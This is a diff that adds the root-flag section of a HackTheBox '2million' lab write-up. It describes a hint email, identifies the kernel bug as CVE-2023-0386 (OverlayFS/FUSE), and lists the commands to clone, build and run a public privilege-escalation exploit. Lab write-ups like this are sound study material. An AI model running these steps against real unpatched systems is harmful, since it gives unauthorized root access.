@@ -277,3 +277,46 @@ user.txt
 ## Root flag
 
 Navigating to website /var/www folder, not finding anything. But I do locate a folder /var/mail/
+
+Here we find this email:
+
+```
+From: ch4p <ch4p@2million.htb>
+To: admin <admin@2million.htb>
+Cc: g0blin <g0blin@2million.htb>
+Subject: Urgent: Patch System OS
+Date: Tue, 1 June 2023 10:45:22 -0700
+Message-ID: <9876543210@2million.htb>
+X-Mailer: ThunderMail Pro 5.2
+
+Hey admin,
+
+I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.
+
+HTB Godfather
+```
+
+We can easily google **overlayfs / fuse cve**, we find **CVE-2023-0386**.
+
+The exploit can be downloaded from a certain github:
+
+```git clone https://github.com/puckiestyle/CVE-2023-0386```
+
+I used scp to send it over to the admin account. (you have to zip the dir first)
+
+
+Once unzipped, cd into the folder, run:
+
+```make all```
+
+Then:
+
+```./fuse ./ovlcap/lower ./gc```
+
+In another terminal (start new ssh session with admin):
+
+```./exp```
+
+Why do we want separate processes? Because the exploit needs two cooperating processes running at once, the FUSE filesystem serving the malicious files, and the exp binary exploiting OverlayFS against it.
+
+In the process running **./exp** we now got root, and can navigate to the root folder where the **root.txt** flag is located.
